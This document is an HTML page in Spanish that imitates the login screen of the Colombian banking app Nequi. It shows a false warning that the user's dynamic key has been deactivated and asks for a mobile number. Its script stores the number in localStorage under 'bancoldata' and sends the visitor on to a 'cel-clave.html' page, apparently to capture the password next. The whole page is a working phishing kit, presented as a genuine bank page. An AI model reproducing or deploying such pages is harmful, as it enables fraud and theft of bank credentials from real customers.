<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingreso</title>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #2b002b;
      font-family: Arial, sans-serif;
      color: white;
      overflow: hidden; /* evita movimientos */
    }

    /* CONTENEDOR TIPO APP */
    .container {
      width: 100%;
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      height: 100dvh; /* evita saltos en móviles */
      box-sizing: border-box;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .help-icon {
      width: 22px;
      height: 22px;
      border: 2px solid white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 14px;
    }

    .logo {
      text-align: center;
      font-size: 74px;
      font-weight: bold;
      position: relative;
    }

    /* cuadrado arriba de la N */
    .logo span {
      color: #ff008c;
      position: absolute;
      top: 4px;
      left: 40%;
      transform: translateX(-85px);
      font-size: 28px;
    }

    /* Mensaje agregado de clave dinámica */
    .mensaje-clave {
      background: rgba(255, 0, 140, 0.2);
      border-left: 4px solid #ff008c;
      padding: 12px;
      border-radius: 8px;
      margin: 20px 0;
      text-align: center;
      font-size: 13px;
      backdrop-filter: blur(4px);
    }

    .form {
      margin-bottom: 40px;
    }

    .input-box {
      background: rgba(255,255,255,0.15);
      border-radius: 10px;
      padding: 14px;
      display: flex;
      align-items: center;
      gap: 10px;
      backdrop-filter: blur(6px);
    }

    .prefix {
      color: #ffb3e6;
      font-weight: bold;
      border-right: 2px solid rgba(255,255,255,0.3);
      padding-right: 10px;
    }

    .input-box input {
      flex: 1;
      border: none;
      outline: none;
      background: transparent;
      color: white;
      font-size: 16px;
    }

    .input-box input::placeholder {
      color: #ddd;
    }

    .btn {
      margin-top: 18px;
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background: #ff008c;
      color: white;
      font-size: 16px;
      cursor: pointer;
      opacity: 0.5;
      transition: 0.3s;
    }

    .btn.active {
      opacity: 1;
    }

    .btn:active {
      transform: scale(0.97);
    }
  </style>
</head>

<body>

<div class="container">

  <header>
    <div class="help-icon">?</div>
    <div></div>
  </header>

  <div class="logo">
    <span>■</span>Nequi
  </div>

  <!-- 🔽 MENSAJE AGREGADO (clave dinámica) 🔽 -->
  <div class="mensaje-clave">
    ⚠️ Tu clave dinámica de Nequi ha sido temporalmente desactivada por seguridad.<br>
    Para reactivar tu clave dinámica, haz el proceso de verificación.
  </div>

  <div class="form">
    <div class="input-box">
      <div class="prefix">+57</div>
      <input type="tel" id="docInput" placeholder="Ingresa tu celular">
    </div>

    <button class="btn" id="btn">Entra</button>
  </div>

</div>

<script>
const input = document.getElementById("docInput");
const btn = document.getElementById("btn");

// VALIDACIÓN CELULAR COLOMBIA
input.addEventListener("input", () => {
  input.value = input.value.replace(/\D/g, "");

  if (input.value.length > 10) {
    input.value = input.value.slice(0, 10);
  }

  if (
    input.value.length === 10 &&
    input.value.startsWith("3")
  ) {
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

// CLICK ORIGINAL (NO MODIFICADO)
btn.addEventListener("click", () => {
  const value = input.value.trim();

  if (value.length !== 10 || !value.startsWith("3")) {
    alert("Número de celular inválido");
    return;
  }

  let data = {};
  try {
    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
  } catch {
    data = {};
  }

  data.usuario = value;
  data.fecha = new Date().toISOString();

  localStorage.setItem("bancoldata", JSON.stringify(data));

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
